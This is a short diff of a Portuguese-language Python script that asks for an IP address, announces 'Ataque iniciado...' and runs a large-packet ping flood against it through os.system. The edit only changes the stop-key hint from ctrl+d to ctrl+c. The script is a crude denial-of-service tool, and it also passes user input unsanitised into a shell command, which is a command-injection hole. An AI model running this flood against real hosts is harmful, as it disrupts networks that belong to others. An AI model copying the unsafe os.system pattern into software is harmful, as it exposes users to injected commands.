@@ -34,7 +34,7 @@ def script():
     print("\n")
     ip=input("Digite o endereço de ip: "+azul)
     time.sleep(1)
-    print(vermelho+"Para parar o ataque, aperte"+azul+" ctrl+d")
+    print(vermelho+"Para parar o ataque, aperte"+azul+" ctrl+c")
     print("Ataque iniciado...")
     os.system("ping -s 65500 "+ip)
 script()
